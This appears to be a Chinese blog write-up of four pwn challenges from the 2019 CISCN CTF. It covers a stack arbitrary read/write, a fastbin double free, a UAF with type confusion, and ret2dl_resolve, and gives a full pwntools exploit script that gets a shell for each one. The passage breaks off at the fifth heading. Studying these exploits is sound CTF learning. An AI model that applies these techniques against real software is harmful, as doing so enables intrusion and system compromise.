---
title: 2019CISCN_PWN(一)
date: 2019-04-28 10:31:02
tags: pwn
---
# 2019CISCN_PWN题解

## 0x00  Your_pwn

### 防护

```
liwc@ubuntu:~/pwn/2019_guosai/your_pwn$ checksec pwn
[*] '/home/liwc/pwn/2019_guosai/your_pwn/pwn'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

RELRO没全开，其余全开

### 分析

首先会向栈上写0x100，然后循环调用sub_B35函数。函数要求输入一个index，然后leak出从rbp - 0x150起的v4[index]的值，然后将值覆盖为要修改的值，也就是实现栈上的任意读写。

```c
_BOOL8 sub_B35()
{
  int index; // [rsp+4h] [rbp-15Ch]
  int v2; // [rsp+8h] [rbp-158h]
  int i; // [rsp+Ch] [rbp-154h]
  char v4[64]; // [rsp+10h] [rbp-150h]
  char s; // [rsp+50h] [rbp-110h]
  unsigned __int64 v6; // [rsp+158h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  memset(&s, 0, 0x100uLL);
  memset(v4, 0, 0x28uLL);
  for ( i = 0; i <= 40; ++i )
  {
    puts("input index");
    __isoc99_scanf("%d", &index);
    printf("now value(hex) %x\n", (unsigned int)v4[index]);
    puts("input new value");
    __isoc99_scanf("%d", &v2);
    v4[index] = v2;
  }
  puts("do you want continue(yes/no)? ");
  read(0, &s, 0x100uLL);
  return strncmp(&s, "yes", 3uLL) == 0;
}
```

### 利用

先leak出libc地址

libc在rsp+0x280处，一开始输入的name在rsp + 0x170处，

```
gef➤  dereference $rsp
0x00007fffffffdc90│+0x0140: 0x0000000000000000
0x00007fffffffdc98│+0x0148: 0x0000000000000000
0x00007fffffffdca0│+0x0150: 0x0000000000000000
0x00007fffffffdca8│+0x0158: 0x82e23df75b4cba00
0x00007fffffffdcb0│+0x0160: 0x00007fffffffddd0  →  0x0000555555554ca0  →   push r15	 ← $rbp
0x00007fffffffdcb8│+0x0168: 0x0000555555554b11  →   test eax, eax
0x00007fffffffdcc0│+0x0170: 0x0000000a6377696c ("liwc"?)


gef➤  dereference $rsp
0x00007fffffffddd0│+0x0280: 0x0000555555554ca0  →   push r15
0x00007fffffffddd8│+0x0288: 0x00007ffff7a2d830  →  <__libc_start_main+240> mov edi, eax

```

可以看到，在libc地址为0x7f766337c830时，leak出的值为ffffffc8，所以只需要删除ffffff即可。

```
0x00007fffbaeeb878│+0x0288: 0x00007f765337c830  →  <__libc_start_main+240> mov edi, eax
['30', 'ffffffc8', '37', '53', '76', '7f', '0', '0']
```

最后直接把retn地址覆盖为one_gadget即可，直接绕过了canary，exp如下
<!-- more -->
```python
from pwn import *
import struct
# from LibcSearcher import *
context.log_level = "debug"

p = process("./pwn")
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

p.recvuntil("name:")
p.sendline("liwc")
nums = []
for i in range(8):
	p.recvuntil("index\n")
	p.sendline(str(0x288 - 0x10 + i))
	num = p.recvline().split(' ')[-1].strip()
	p.recvuntil("input new value\n")
	p.sendline(str(int("0x" + num, 16)))
	if num.startswith("ffffff"):
		num = num[-2:]
	nums.append(num)

tmp = ""
for ch in [chr(int("0x" + i, 16)) for i in nums]:
	tmp += ch
libc_addr = u64(tmp)
libc_base = libc_addr - 0x20830
print hex(libc_addr)

# gdb.attach(p)
one_gadget = 0x45216 # 0x4526a 0xf02a4 0xf1147
one_gadget += libc_base
one_gadget = p64(one_gadget)
rip = (0x150 + 8)

for i in range(8):
	p.recvuntil("index\n")
	p.sendline(str(rip + i))
	p.recvuntil("input new value\n")
	p.sendline(str(ord(one_gadget[i])))

for i in range(41 - 16):
	p.recvuntil("index\n")
	p.sendline(str(10))
	num = p.recvline().split(' ')[-1].strip()
	p.recvuntil("input new value\n")
	p.sendline(str(int("0x" + num, 16)))

p.recvuntil("? \n")
p.sendline("no")
p.interactive()	
```

不过，似乎原题未提供libc，那么我们用one_gadget可能会不太方便（其实也行）。那么就还要leak出程序本身的加载地址，然后将rip劫持为pop rdi，再在栈上布置/bin/sh\x00的地址，最后再布置system@libc，然后就能getshell。照这种思路，正好会用40次读写，说明这个题目限制的还是比较死的。

```python
from pwn import *
import struct
# from LibcSearcher import *
context.log_level = "debug"

p = process("./pwn")
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

p.recvuntil("name:")
p.sendline("/bin/sh\x00")
nums = []

# leak libc
for i in range(8):
	p.recvuntil("index\n")
	p.sendline(str(0x288 - 0x10 + i))
	num = p.recvline().split(' ')[-1].strip()
	p.recvuntil("input new value\n")
	p.sendline(str(int("0x" + num, 16)))
	if num.startswith("ffffff"):
		num = num[-2:]
	nums.append(num)

tmp = ""
for ch in [chr(int("0x" + i, 16)) for i in nums]:
	tmp += ch
libc_addr = u64(tmp)
libc_base = libc_addr - 0x20830
binsh = libc_base + next(libc.search("/bin/sh"))
system = libc_base + libc.symbols['system']
print hex(libc_addr)

nums = []	
# leak elf
for i in range(8):
	p.recvuntil("index\n")
	p.sendline(str(0x280 - 0x10 + i))
	num = p.recvline().split(' ')[-1].strip()
	p.recvuntil("input new value\n")
	p.sendline(str(int("0x" + num, 16)))
	if num.startswith("ffffff"):
		num = num[-2:]
	nums.append(num)

tmp = ""
for ch in [chr(int("0x" + i, 16)) for i in nums]:
	tmp += ch
elf_addr = u64(tmp)
elf_base = elf_addr - 0xca0
print hex(elf_base)

poprdi = 0x0000000000000d03 #: pop rdi ; ret
poprdi += elf_base

rip = 0x150 + 8

# hijack retn addr
for i in range(8):
	p.recvuntil("index\n")
	p.sendline(str(rip + i))
	p.recvuntil("input new value\n")
	p.sendline(str(ord(p64(poprdi)[i])))

# put /bin/sh addr on stack
for i in range(8):
	p.recvuntil("index\n")
	p.sendline(str(rip + 8 + i))
	p.recvuntil("input new value\n")
	p.sendline(str(ord(p64(binsh)[i])))

# call system
for i in range(8):
	p.recvuntil("index\n")
	p.sendline(str(rip + 16 + i))
	p.recvuntil("input new value\n")
	p.sendline(str(ord(p64(system)[i])))

for i in range(41 - 40):
	p.recvuntil("index\n")
	p.sendline(str(10))
	num = p.recvline().split(' ')[-1].strip()
	p.recvuntil("input new value\n")
	p.sendline(str(int("0x" + num, 16)))

p.recvuntil("? \n")
p.sendline("no")
p.interactive()	
```

## 0x01 daily

### 防护

```
liwc@ubuntu:~/pwn/2019_guosai/daily$ checksec daily
[*] '/home/liwc/pwn/2019_guosai/daily/daily'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

没有开启PIE，但其余全开，RELRO开启。

### 分析

#### add

会根据输入的size malloc一个chunk，将chunk总数量num存储在bss段上，并且每次将chunk的size和指针都存在bss端上。

#### delete

如果bss段相应的指针不为null，则free掉，并置为null，同时将size清零，num自减1。但是这里index存在漏洞。free的指针是用index * 16 + 0x602068计算得到的，所以如果在堆上伪造fake chunk和指向fake chunk的指针，就可以实现任意地址free，也就可以实现double free（或者unlink）。

```
.text:0000000000400C24                 mov     eax, [rbp+index]
.text:0000000000400C27                 cdqe
.text:0000000000400C29                 shl     rax, 4
.text:0000000000400C2D                 add     rax, 602068h
.text:0000000000400C33                 mov     rax, [rax]
.text:0000000000400C36                 mov     rdi, rax        ; ptr
.text:0000000000400C39                 call    free
```

#### upgrade

根据存储的size向bss段中写。

### 利用

#### leak libc

首先通过正常方法leak出libc：即放入unsorted bin后，再申请出来。

```python
add(0x60, 'a' * 0x10) # 0
add(0x80, "b" * 0x10) # 1
add(0x10, "c" * 0x10) # 2 
add(0x80, "d" * 0x10) # 3
add(0x10, "e" * 0x10) # 4

free(1)
free(3)

add(0x80, "b" * 0x8) # 1
add(0x80, "d" * 0x8) # 3


show()

heap_addr = u64(p.recvuntil("2 :", drop=True).split("bbbbbbbb")[-1].ljust(8, "\x00")) - (0xd0 + 0x50)
libc_addr = u64(p.recvuntil("\x7f")[-6:].ljust(8, "\x00"))
libc.address = libc_addr - 0x3c4b78
print hex(libc.address)
print hex(heap_addr)
```

#### 劫持控制流

利用上述提到的漏洞，在堆上构造fake chunk和指向fake chunk的指针，然后构建fastbin 2free.

```python
fake_chunk = p64(0) + p64(0x71)
fake_chunk += "a" * 0x60
fake_chunk += p64(0x60) + p64(0x100)
fake_chunk += p64(0x60) + p64(heap_addr + 0x1f0)

bss = 0x602068

add(0x200, fake_chunk) # 0x1a0

offset = (heap_addr + 0x1f0 + 0x60 + 0x18 - bss) / 16
free(str(offset))

free(0)

change(5, fake_chunk)
free(str(offset))
```



此时：

fd -> fake_chunk ->idx0 ->fake_chunk

```
gef➤  heap bins
[+] No Tcache in this version of libc
────────────────────── Fastbins for arena 0x7fc5dc6d9b20 ──────────────────────
Fastbins[idx=0, size=0x10] 0x00
Fastbins[idx=1, size=0x20] 0x00
Fastbins[idx=2, size=0x30] 0x00
Fastbins[idx=3, size=0x40] 0x00
Fastbins[idx=4, size=0x50] 0x00
Fastbins[idx=5, size=0x60]  ←  Chunk(addr=0x25a01f0, size=0x70, flags=PREV_INUSE)  ←  Chunk(addr=0x25a0010, size=0x70, flags=PREV_INUSE)  ←  Chunk(addr=0x25a01f0, size=0x70, flags=PREV_INUSE)  →  [loop detected]

```

但是本题操蛋的是，四个one_gadget对malloc_hook都不行，所以只能尝试free_hook。但是不能直接劫持free_hook,所以我们尝试修改top，劫持到free_hook——不过，此路也走不通，因为没开pie，堆地址不是0x55开头。其实，sb了，直接劫持到bss段即可用change和add方法实现任意读写

#### 完整exp

```python
from pwn import *
# from LibcSearcher import *
context.log_level = "debug"

elf = ELF("./daily")
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
p = process("./daily")


def show():
    p.recvuntil("choice:")
    p.sendline("1")

def add(size, content):
    p.recvuntil("choice:")
    p.sendline("2")
    p.recvuntil("of daily:")
    p.sendline(str(size))
    p.recvuntil("daily\n")
    p.send(content)

def change(index, content):
    p.recvuntil("choice:")
    p.sendline("3")
    p.recvuntil("of daily:")
    p.sendline(str(index))
    p.recvuntil("daily\n")
    p.send(content)

def free(index):
    p.recvuntil("choice:")
    p.sendline("4")
    p.recvuntil("daily:")
    p.sendline(str(index))

add(0x60, 'a' * 0x10) # 0
add(0x80, "b" * 0x10) # 1
add(0x10, "c" * 0x10) # 2 
add(0x80, "d" * 0x10) # 3
add(0x10, "e" * 0x10) # 4

free(1)
free(3)

add(0x80, "b" * 0x8) # 1
add(0x80, "d" * 0x8) # 3

show()

heap_addr = u64(p.recvuntil("2 :", drop=True).split("bbbbbbbb")[-1].ljust(8, "\x00")) - 0x120
libc_addr = u64(p.recvuntil("\x7f")[-6:].ljust(8, "\x00"))
libc.address = libc_addr - 0x3c4b78
free_hook = libc.symbols['__free_hook']
print hex(libc.address)
print hex(heap_addr)

bss = 0x602068
one_gadget = 0x4526a	 # 0x4526a 0xf02a4 0xf1147
one_gadget += libc.address

# make fake chunk in heap
fake_chunk = p64(0) + p64(0x71)
fake_chunk += "a" * 0x60
fake_chunk += p64(0x60) + p64(0x100)
fake_chunk += p64(0x60) + p64(heap_addr + 0x1f0) # fake array_item
add(0x200, fake_chunk) # 0x1f0

# make fastbin double free
offset = (heap_addr + 0x1f0 + 0x60 + 0x18 - bss) / 16
free(str(offset))

free(0)

change(5, fake_chunk)
free(str(offset))

# fastbin attack
payload = p64(0x6020d8)
add(0x60, payload) # idx0

add(0x60, "C" * 0x10) 
add(0x60, "C" * 0x10) 
add(0x70, "D" * 0x10) # mark in bss
add(0x60, p64(free_hook))

change(8, p64(one_gadget))
free(2)

p.interactive() 
```

## 0x02  Double

### 防护

```
liwc@ubuntu:~/pwn/2019_guosai/Double$ checksec pwn
[*] '/home/liwc/pwn/2019_guosai/Double/pwn'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

```

注意部分开启了RELRO，且没有开启PIE。从题目名字推测应该也是用double free。

### 分析

通过逆向，ptr的结构如下：

```c
struct ptr{
  num; 			// + 0x0
  size; 		// + 0x4
  *content; // + 0x8
  *next;    // + 0x10
};
```

#### new

首先malloc一个0x18的chunk，然后用input函数读入chunk的内容，注意当读入0x100个字节而没有\n时，会返回0xff。

然后如果是第一次申请，或者该次与prev_ptr的字符串内容不同时，会根据size+1创建一个malloc一个chunk，然后从栈上拷贝size+1的数据到新创建的堆块中，然后再ptr结构体中设置好size和新chunk的指针。如果head_ptr不为null，会令num= prev_ptr的num+ 1，并且将prev_ptr的next指针设置为当前指针；否则，令num为0，然后令head_ptr = 当前指针。最后，还会令prev_ptr指向当前指针。

如果不是第一次申请，或者该次与prev_ptr的字符串内容相同，那么直接令num++，size = prev_ptr.size，content也指向prev_ptr.content，next = null，然后将prev_ptr的next指针指向当前ptr，最后，令prev_ptr指向当前指针。

由上述分析，我们知道该题是用一个单向链表结构管理堆块的， bss段存储链表的头指针head_ptr和尾指针prev_ptr，每个ptr结构中都存储了next指针，这时我感觉该题应该是要构造类型混淆。另外还有一个点就是如果两次创建相同内容的堆块，则会构造出两个指针指向同一块内存空间。另外，num都是根据prev_ptr判断的。

#### list

从head_ptr起开始遍历链表，找到相应编号的chunk，并puts出来。

#### edit

从head_ptr起开始遍历，找到后先读入chunk内容，如果size小于等于原来的size，直接memcpy；否则，malloc一个新chunk，然后copy并记录到相应ptr上。

#### delete

从head_ptr开始遍历，找到后先free content堆块，再free ptr堆块。在删除头和非头时操作不同。这里明显存在UAF漏洞。

```c
int delete()
{
  int index; // [rsp+Ch] [rbp-14h]
  void *ptr; // [rsp+10h] [rbp-10h]
  __int64 Prev_ptr; // [rsp+18h] [rbp-8h]

  if ( !head_ptr )
    return puts("List empty");
  printf("Info index: ");
  index = sub_401A6A();
  ptr = (void *)head_ptr;
  Prev_ptr = 0LL;
  while ( 1 )
  {
    if ( !ptr )
      return puts("Index not found");
    if ( index == *(_DWORD *)ptr )
      break;
    Prev_ptr = (__int64)ptr;
    ptr = (void *)*((_QWORD *)ptr + 2);
  }
  if ( Prev_ptr )
  {
    *(_QWORD *)(Prev_ptr + 16) = *((_QWORD *)ptr + 2);
    if ( ptr == (void *)prev_ptr )
      prev_ptr = Prev_ptr;
    free(*((void **)ptr + 1));
    free(ptr);
  }
  else
  {
    head_ptr = *((_QWORD *)ptr + 2);
    if ( ptr == (void *)prev_ptr )
      prev_ptr = 0LL;
    free(*((void **)ptr + 1));
    free(ptr);
  }
  return puts("Success");
}
```

### 利用

首先需要leak libc，然后改got表为one_gadget即可。思考一下怎样布局，leak libc。

#### leak libc

因为leak的都是content指针指向的堆块，所以只要让两个content指针指向同一个unsorted bin，先将它free，再show出来即可。

```python
add(0x80 * "a" + "\n") # 0
add(0x80 * "a" + "\n") # 1
add(0x10 * "b" + "\n") # 2

free(0) # head is 1

show(1)

addr = p.recvuntil("\x7f")[-6:].ljust(8, "\x00")
libc.address = addr - 0x3c4b78
```

#### 劫持控制流

我们完全可以按daily的思路，构造fastbin attack，然后就可以劫持到任意地址。首先尝试直接劫持到malloc_hook之前的地址，但是由于必须写很多数据，失败。

所以不能再用fastbin attack的思路了，尝试构造类型混淆。

首先创建三个0x10的content

```
add(0x10 * "a" + "\n") # 4
add(0x10 * "a" + "\n") # 5
add(0x10 * "a" + "\n") # 6
free(5)
free(6)
```

然后free掉，使得fastbin为：

```
p6->c4->p5->c4
```

然后再分配：

```
add(0x20 * "a" + "\n") # 5
```

true_p5 = old_p6 true_c5 = other

此时，fastbin为：

```
c4->p5->c4
```

再分配

```
add(0x10 * "b" + "\n") # 6
```

true_p6 = ord_c4，此时，修改c4就可以修改true_p6，然后也就实现了任意地址读写

```python
add(0x10 * "a" + "\n") # 4
add(0x10 * "a" + "\n") # 5
add(0x10 * "a" + "\n") # 6
free(5)
free(6)

add(0x20 * "a" + "\n") # 5

add(0x10 * "c" + "\n") # 6
```

由于atoi只能输入5位，考虑劫持别的got。所以最后选择覆盖free@got，然后布置/bin/sh\x00在chunk上即可。

#### 完整exp

```python
from pwn import *
from time import sleep
# from LibcSearcher import *
context.log_level = "debug"

elf = ELF("./pwn")
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
p = process("./pwn")

def add(content):
    p.recvuntil("> ")
    p.sendline("1")
    p.recvuntil("data:\n")
    p.send(content)

def show(index):
    p.recvuntil("> ")
    p.sendline("2")
    p.recvuntil("index: ")
    p.sendline(str(index))

def change(index, content):
    p.recvuntil("> ")
    p.sendline("3")
    p.recvuntil("index: ")
    p.sendline(str(index))
    sleep(0.1)
    p.send(content)

def free(index):
    p.recvuntil("> ")
    p.sendline("4")
    p.recvuntil("index: ")
    p.sendline(str(index))

# leak libc

add(0x80 * "a" + "\n") # 0
add(0x80 * "a" + "\n") # 1
add("/bin/sh\x00" + "\n") # 2

free(0) # head is 1
show(1)

addr = u64(p.recvuntil("\x7f")[-6:].ljust(8, "\x00"))
libc.address = addr - 0x3c4b78
main_arena = addr - 88
free_got = elf.got["free"]
system = libc.symbols['system']
binsh = next(libc.search("/bin/sh"))

# make type confusion
add(0x80 * "a" + "\n") # 3

add(0x10 * "a" + "\n") # 4
add(0x10 * "a" + "\n") # 5
add(0x10 * "a" + "\n") # 6
free(5)
free(6)

add(0x20 * "a" + "\n") # 5
add(0x10 * "c" + "\n") # 6

# hijack got
payload = p32(6) + p32(0x10) + p64(free_got)
change(4, payload + "\n")
change(6, p64(system) + "\n")
free(2)

p.interactive() 
```

## 0x03  baby_pwn

### 分析

就是re2dl_resolve。

直接修改XDCTF2015的exp即可。

步骤有：

1. 找ppp、popebp、leave;ret等作stack pivoting的gadget；
2. 找到plt段，rel_plt段，dynsym段，dynstr等段的地址
3. 构造即可rel_plt重定位到dynsym表。

readelf的使用如下

```
liwc@ubuntu:~/pwn/2019_guosai/baby_pwn$ readelf -S pwn
There are 31 section headers, starting at offset 0x18b0:

Section Headers:
  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al
  [ 0]                   NULL            00000000 000000 000000 00      0   0  0
  [ 1] .interp           PROGBITS        08048154 000154 000013 00   A  0   0  1
  [ 2] .note.ABI-tag     NOTE            08048168 000168 000020 00   A  0   0  4
  [ 3] .note.gnu.build-i NOTE            08048188 000188 000024 00   A  0   0  4
  [ 4] .gnu.hash         GNU_HASH        080481ac 0001ac 000030 04   A  5   0  4
  [ 5] .dynsym           DYNSYM          080481dc 0001dc 0000a0 10   A  6   1  4
  [ 6] .dynstr           STRTAB          0804827c 00027c 00006c 00   A  0   0  1
  [ 7] .gnu.version      VERSYM          080482e8 0002e8 000014 02   A  5   0  2
  [ 8] .gnu.version_r    VERNEED         080482fc 0002fc 000020 00   A  6   1  4
  [ 9] .rel.dyn          REL             0804831c 00031c 000020 08   A  5   0  4
  [10] .rel.plt          REL             0804833c 00033c 000020 08  AI  5  24  4
  [11] .init             PROGBITS        0804835c 00035c 000023 00  AX  0   0  4
  [12] .plt              PROGBITS        08048380 000380 000050 04  AX  0   0 16
  [13] .plt.got          PROGBITS        080483d0 0003d0 000008 00  AX  0   0  8
  [14] .text             PROGBITS        080483e0 0003e0 000202 00  AX  0   0 16
  [15] .fini             PROGBITS        080485e4 0005e4 000014 00  AX  0   0  4
  [16] .rodata           PROGBITS        080485f8 0005f8 000008 00   A  0   0  4
  [17] .eh_frame_hdr     PROGBITS        08048600 000600 00003c 00   A  0   0  4
  [18] .eh_frame         PROGBITS        0804863c 00063c 00010c 00   A  0   0  4
  [19] .init_array       INIT_ARRAY      08049f08 000f08 000004 00  WA  0   0  4
  [20] .fini_array       FINI_ARRAY      08049f0c 000f0c 000004 00  WA  0   0  4
  [21] .jcr              PROGBITS        08049f10 000f10 000004 00  WA  0   0  4
  [22] .dynamic          DYNAMIC         08049f14 000f14 0000e8 08  WA  6   0  4
  [23] .got              PROGBITS        08049ffc 000ffc 000004 04  WA  0   0  4
  [24] .got.plt          PROGBITS        0804a000 001000 00001c 04  WA  0   0  4
  [25] .data             PROGBITS        0804a01c 00101c 000008 00  WA  0   0  4
  [26] .bss              NOBITS          0804a040 001024 00002c 00  WA  0   0 32
  [27] .comment          PROGBITS        00000000 001024 000035 01  MS  0   0  1
  [28] .shstrtab         STRTAB          00000000 0017a5 00010a 00      0   0  1
  [29] .symtab           SYMTAB          00000000 00105c 0004c0 10     30  47  4
  [30] .strtab           STRTAB          00000000 00151c 000289 00      0   0  1
Key to Flags:
  W (write), A (alloc), X (execute), M (merge), S (strings)
  I (info), L (link order), G (group), T (TLS), E (exclude), x (unknown)
  O (extra OS processing required) o (OS specific), p (processor specific)

```

### 利用

#### 完整exp：

```python
#!/usr/bin/python

from pwn import *
elf = ELF('./pwn')
offset = 44
read_plt = elf.plt['read']
# write_plt = elf.plt['write']

ppp_ret = 0x080485d9 # 0x080485d9 : pop esi ; pop edi ; pop ebp ; ret
pop_ebp_ret = 0x080485db # 0x080485db : pop ebp ; ret
leave_ret = 0x08048448	 # 0x08048448 : leave ; ret

stack_size = 0x800
bss_addr = 0x0804a040 # readelf -S bof | grep ".bss"
base_stage = bss_addr + stack_size

p = process('./pwn')


payload = 'A' * offset
payload += p32(read_plt) 
payload += p32(ppp_ret)
payload += p32(0)
payload += p32(base_stage)
payload += p32(100)
payload += p32(pop_ebp_ret) 
payload += p32(base_stage)
payload += p32(leave_ret) 
p.sendline(payload)

cmd = "/bin/sh"
plt_0 = 0x08048380
rel_plt = 0x0804833c
index_offset = (base_stage + 28) - rel_plt
read_got = elf.got['read']
dynsym = 0x080481dc
dynstr = 0x0804827c
fake_sym_addr = base_stage + 36
align = 0x10 - ((fake_sym_addr - dynsym) & 0xf)
fake_sym_addr = fake_sym_addr + align
index_dynsym = (fake_sym_addr - dynsym) / 0x10
r_info = (index_dynsym << 8) | 0x7
fake_reloc = p32(read_got) + p32(r_info)
st_name = (fake_sym_addr + 0x10) - dynstr
fake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12)

payload2 = 'AAAA'
payload2 += p32(plt_0)
payload2 += p32(index_offset)
payload2 += 'AAAA'
payload2 += p32(base_stage + 80)
payload2 += 'aaaa'
payload2 += 'aaaa'
payload2 += fake_reloc 
payload2 += 'B' * align
payload2 += fake_sym 
payload2 += "system\x00"
payload2 += 'A' * (80 - len(payload2))
payload2 += cmd + '\x00'
payload2 += 'A' * (100 - len(payload2))
p.sendline(payload2)
p.interactive()

```

## 0x04 BMS

